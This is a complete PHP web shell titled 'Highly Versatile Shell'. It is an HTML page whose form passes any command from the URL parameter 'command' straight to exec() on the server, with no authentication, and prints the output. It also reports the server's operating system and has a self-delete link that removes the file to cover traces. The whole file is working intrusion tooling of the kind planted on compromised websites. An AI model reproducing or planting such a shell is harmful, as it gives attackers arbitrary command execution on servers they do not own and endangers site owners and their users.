<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">

    <title>HVS - Highly Versatile Shell</title>


    <style type="text/css">
        
        * {
            box-sizing: border-box;
            font-family: monospace;
        }

        html {
            padding: 0;
            margin: 0;
        }

        body {
            background-color: #131313;
        }

        fieldset {
            box-shadow: 0 -1px 0 rgb(0 0 0 / 50%);
            border: 0;
            border-top: rgba(38, 38, 38) solid 1px;
            position: fixed;
            bottom: 0;
            right: 0;
            left: 0;
            padding: 0;
        }

        fieldset input {
            border: none;
            background-color: #131313;
            color: gray;
        }

        fieldset input[type="text"] {
            width: 90%;
            height: 30px;
            font-size: 1.5rem;
        }

        fieldset input[type="text"]:focus {
            outline: none;
        }

        fieldset input[type="submit"] {
            cursor: pointer;
            width: 8%;
            height: 20px;
            font-size: 1.5rem;
            font-family: monospace;
        }

        #log {
            width: 100%;
            height: 100%;
            padding: 10px;
            color: gray;
        }

    </style>

</head>

<body>

    <center style="color: #007705; font-family: sans-serif;">

        <h1>Highly Versatile Shell</h1>

    </center>

    <form method="get">

        <fieldset>

            <input type="text" placeholder=" Write any command..." name="command" autofocus>

            <input type="submit" value="Send">

        </fieldset>

    </form>

    <div id="log">

    <?php

    print("<i>Today's date: " . date("d-m-Y") . " - " . "Operating system: " . PHP_OS . "</i>");

    ?>

    <a href="?destroy" target="_self" style="color: red; float: right;">Click to destroy this file!</a> <br> <br>

    <?php

    if (isset($_GET['destroy'])) { unlink(__FILE__); }

    if (isset($_GET['command']) and !empty($_GET['command'])) {

        $output = "";

        exec($_GET['command'], $output);

        print("<pre>");        

        foreach ($output as $line) {

            print($line . "\n");

        }

        print("</pre>");

    }

    ?>

    <br>

    </div>


</body>

</html>
